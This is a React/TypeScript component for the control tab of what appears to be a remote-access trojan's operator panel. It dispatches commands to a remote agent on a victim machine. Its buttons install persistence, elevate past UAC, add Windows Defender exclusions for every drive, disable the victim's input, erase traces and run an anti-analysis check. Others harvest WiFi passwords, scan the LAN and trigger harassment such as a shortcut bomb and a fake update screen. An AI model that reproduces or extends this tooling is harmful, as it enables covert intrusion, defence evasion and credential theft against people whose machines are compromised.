import { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
  DialogFooter,
} from "@/components/ui/dialog";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";
import {
  Lock,
  Unlock,
  Power,
  Trash2,
  ShieldAlert,
  ShieldOff,
  ShieldCheck,
  MousePointerClick,
  MousePointer,
  Database,
  Wifi,
  Network,
  FolderTree,
  MessageSquare,
  Image,
  Monitor,
  Moon,
  Sun,
  Bomb,
  Volume2,
  Globe,
  Clock,
  Cog,
  ListTree,
  Pause,
  Play,
  Loader2,
} from "lucide-react";
import { dispatchCommand, waitForResult } from "@/lib/commands";
import { toast } from "sonner";

const ControlTab = ({
  machineId,
  machineName,
}: {
  machineId: string;
  machineName: string;
}) => {
  const [confirmAction, setConfirmAction] = useState<{
    command: string;
    label: string;
    description: string;
    args?: Record<string, unknown>;
  } | null>(null);
  const [messageText, setMessageText] = useState("");
  const [messageOpen, setMessageOpen] = useState(false);
  const [wallpaperUrl, setWallpaperUrl] = useState("");
  const [wallpaperOpen, setWallpaperOpen] = useState(false);
  const [resultModal, setResultModal] = useState<{ label: string; result: string } | null>(null);
  const [sending, setSending] = useState<string | null>(null);

  const send = async (
    command: string,
    label: string,
    args: Record<string, unknown> = {},
    awaitResult = false
  ) => {
    setSending(command);
    const id = await dispatchCommand(machineId, command, args);
    if (!id) {
      toast.error("Failed to send command");
      setSending(null);
      return;
    }
    toast.success(`"${label}" sent to ${machineName}`);

    if (awaitResult) {
      const result = await waitForResult(id);
      if (result?.status === "timeout") {
        setResultModal({ label, result: "Command timed out — agent may be offline or still processing." });
      } else if (result?.status === "error" || result?.status === "failed") {
        setResultModal({ label, result: result?.result || "Command failed with no output." });
      } else if (result?.result) {
        setResultModal({ label, result: result.result });
      } else {
        setResultModal({ label, result: "(no output returned)" });
      }
    }
    setSending(null);
  };

  const confirmAndSend = (
    command: string,
    label: string,
    description: string,
    args?: Record<string, unknown>
  ) => {
    setConfirmAction({ command, label, description, args });
  };

  const ActionBtn = ({
    icon: Icon,
    label,
    command,
    variant = "secondary",
    args,
    danger,
    awaitResult,
    onClick,
  }: {
    icon: React.ElementType;
    label: string;
    command?: string;
    variant?: "default" | "secondary" | "destructive" | "outline";
    args?: Record<string, unknown>;
    danger?: boolean;
    awaitResult?: boolean;
    onClick?: () => void;
  }) => (
    <Button
      variant={variant}
      className={`gap-2 h-auto py-3 px-4 justify-start text-left ${
        danger ? "border-destructive/30 text-destructive hover:bg-destructive/10" : ""
      }`}
      disabled={sending === command}
      onClick={
        onClick ||
        (() => {
          if (danger && command) {
            confirmAndSend(
              command,
              label,
              `This will execute "${label}" on ${machineName}. Are you sure?`,
              args
            );
          } else if (command) {
            send(command, label, args || {}, awaitResult);
          }
        })
      }
    >
      {sending === command ? (
        <Loader2 className="w-4 h-4 animate-spin" />
      ) : (
        <Icon className="w-4 h-4 flex-shrink-0" />
      )}
      <span className="text-sm">{label}</span>
    </Button>
  );

  return (
    <div className="space-y-4">
      {/* Persistence & System */}
      <Card className="border-border/30">
        <CardHeader className="pb-2">
          <CardTitle className="text-xs text-muted-foreground flex items-center gap-2">
            <Lock className="w-3.5 h-3.5 text-primary" /> Persistence & System
          </CardTitle>
        </CardHeader>
        <CardContent className="grid grid-cols-2 md:grid-cols-4 gap-2">
          <ActionBtn icon={Lock} label="Install Persistence" command="persist" variant="default" />
          <ActionBtn icon={Unlock} label="Remove Persistence" command="unpersist" />
          <ActionBtn
            icon={ShieldAlert}
            label="Elevate UAC"
            command="elevate"
            awaitResult
          />
          <ActionBtn icon={ShieldCheck} label="Check Admin" command="isadmin" awaitResult />
        </CardContent>
      </Card>

      {/* Defender Exclusions */}
      <Card className="border-border/30">
        <CardHeader className="pb-2">
          <CardTitle className="text-xs text-muted-foreground flex items-center gap-2">
            <ShieldOff className="w-3.5 h-3.5 text-primary" /> Defender Exclusions
          </CardTitle>
        </CardHeader>
        <CardContent className="grid grid-cols-2 md:grid-cols-4 gap-2">
          <ActionBtn icon={ShieldOff} label="Exclude C:" command="excludec" awaitResult />
          <ActionBtn icon={ShieldOff} label="Exclude All Drives" command="excludeall" awaitResult />
        </CardContent>
      </Card>

      {/* IO & Control */}
      <Card className="border-border/30">
        <CardHeader className="pb-2">
          <CardTitle className="text-xs text-muted-foreground flex items-center gap-2">
            <MousePointer className="w-3.5 h-3.5 text-primary" /> Input / Output Control
          </CardTitle>
        </CardHeader>
        <CardContent className="grid grid-cols-2 md:grid-cols-4 gap-2">
          <ActionBtn
            icon={MousePointerClick}
            label="Disable IO"
            command="disableio"
            danger
          />
          <ActionBtn icon={MousePointer} label="Enable IO" command="enableio" />
          <ActionBtn
            icon={Power}
            label="Disconnect Agent"
            command="exit"
            danger
          />
          <ActionBtn icon={Trash2} label="Cleanup Traces" command="cleanup" danger awaitResult />
        </CardContent>
      </Card>

      {/* Data Collection */}
      <Card className="border-border/30">
        <CardHeader className="pb-2">
          <CardTitle className="text-xs text-muted-foreground flex items-center gap-2">
            <Database className="w-3.5 h-3.5 text-primary" /> Data Collection
          </CardTitle>
        </CardHeader>
        <CardContent className="grid grid-cols-2 md:grid-cols-4 gap-2">
          <ActionBtn icon={Wifi} label="WiFi Passwords" command="wifi" awaitResult />
          <ActionBtn icon={Globe} label="Nearby WiFi" command="nearbywifi" awaitResult />
          <ActionBtn icon={Network} label="LAN Scan" command="enumeratelan" awaitResult />
          <ActionBtn icon={FolderTree} label="Folder Tree" command="foldertree" awaitResult />
          <ActionBtn icon={Cog} label="Anti-Analysis Check" command="antianalysis" awaitResult />
          <ActionBtn icon={ListTree} label="List Processes" command="processes" awaitResult />
        </CardContent>
      </Card>

      {/* Jobs */}
      <Card className="border-border/30">
        <CardHeader className="pb-2">
          <CardTitle className="text-xs text-muted-foreground flex items-center gap-2">
            <Cog className="w-3.5 h-3.5 text-primary" /> Background Jobs
          </CardTitle>
        </CardHeader>
        <CardContent className="grid grid-cols-2 md:grid-cols-4 gap-2">
          <ActionBtn icon={ListTree} label="List Jobs" command="jobs" awaitResult />
          <ActionBtn icon={Pause} label="Pause All Jobs" command="pausejobs" awaitResult />
          <ActionBtn icon={Play} label="Resume Default Jobs" command="resumejobs" awaitResult />
          <ActionBtn icon={Clock} label="Sleep 60s" command="sleep" args={{ seconds: 60 }} />
        </CardContent>
      </Card>

      {/* Pranks / System Manipulation */}
      <Card className="border-border/30">
        <CardHeader className="pb-2">
          <CardTitle className="text-xs text-muted-foreground flex items-center gap-2">
            <MessageSquare className="w-3.5 h-3.5 text-primary" /> System Manipulation
          </CardTitle>
        </CardHeader>
        <CardContent className="grid grid-cols-2 md:grid-cols-4 gap-2">
          <ActionBtn
            icon={MessageSquare}
            label="Message Box"
            onClick={() => setMessageOpen(true)}
          />
          <ActionBtn
            icon={Image}
            label="Set Wallpaper"
            onClick={() => setWallpaperOpen(true)}
          />
          <ActionBtn icon={Monitor} label="Minimize All" command="minimizeall" />
          <ActionBtn icon={Moon} label="Dark Mode" command="darkmode" />
          <ActionBtn icon={Sun} label="Light Mode" command="lightmode" />
          <ActionBtn icon={Bomb} label="Shortcut Bomb" command="shortcutbomb" danger />
          <ActionBtn icon={Globe} label="Fake Update" command="fakeupdate" />
          <ActionBtn icon={Volume2} label="Sound Spam" command="soundspam" />
        </CardContent>
      </Card>

      {/* Confirm Dialog */}
      <AlertDialog
        open={!!confirmAction}
        onOpenChange={(open) => !open && setConfirmAction(null)}
      >
        <AlertDialogContent>
          <AlertDialogHeader>
            <AlertDialogTitle>Confirm Action</AlertDialogTitle>
            <AlertDialogDescription>
              {confirmAction?.description}
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogCancel>Cancel</AlertDialogCancel>
            <AlertDialogAction
              className="bg-destructive text-destructive-foreground hover:bg-destructive/90"
              onClick={() => {
                if (confirmAction) {
                  send(confirmAction.command, confirmAction.label, confirmAction.args || {});
                  setConfirmAction(null);
                }
              }}
            >
              Execute
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>

      {/* Message Dialog */}
      <Dialog open={messageOpen} onOpenChange={setMessageOpen}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle>Send Message Box</DialogTitle>
            <DialogDescription>
              Display a system alert on {machineName}
            </DialogDescription>
          </DialogHeader>
          <Input
            placeholder="Enter message text..."
            value={messageText}
            onChange={(e) => setMessageText(e.target.value)}
          />
          <DialogFooter>
            <Button
              onClick={() => {
                send("message", "Message Box", { text: messageText });
                setMessageOpen(false);
                setMessageText("");
              }}
              disabled={!messageText.trim()}
            >
              Send
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Wallpaper Dialog */}
      <Dialog open={wallpaperOpen} onOpenChange={setWallpaperOpen}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle>Set Wallpaper</DialogTitle>
            <DialogDescription>
              Download and set desktop wallpaper on {machineName}
            </DialogDescription>
          </DialogHeader>
          <Input
            placeholder="Image URL..."
            value={wallpaperUrl}
            onChange={(e) => setWallpaperUrl(e.target.value)}
          />
          <DialogFooter>
            <Button
              onClick={() => {
                send("wallpaper", "Set Wallpaper", { url: wallpaperUrl });
                setWallpaperOpen(false);
                setWallpaperUrl("");
              }}
              disabled={!wallpaperUrl.trim()}
            >
              Apply
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Result Modal */}
      <Dialog
        open={!!resultModal}
        onOpenChange={(open) => !open && setResultModal(null)}
      >
        <DialogContent className="sm:max-w-lg">
          <DialogHeader>
            <DialogTitle>{resultModal?.label} - Result</DialogTitle>
          </DialogHeader>
          <div className="bg-[hsl(222,47%,4%)] rounded-lg p-4 font-mono text-xs max-h-[400px] overflow-auto">
            <pre className="text-gray-300 whitespace-pre-wrap">
              {resultModal?.result}
            </pre>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default ControlTab;
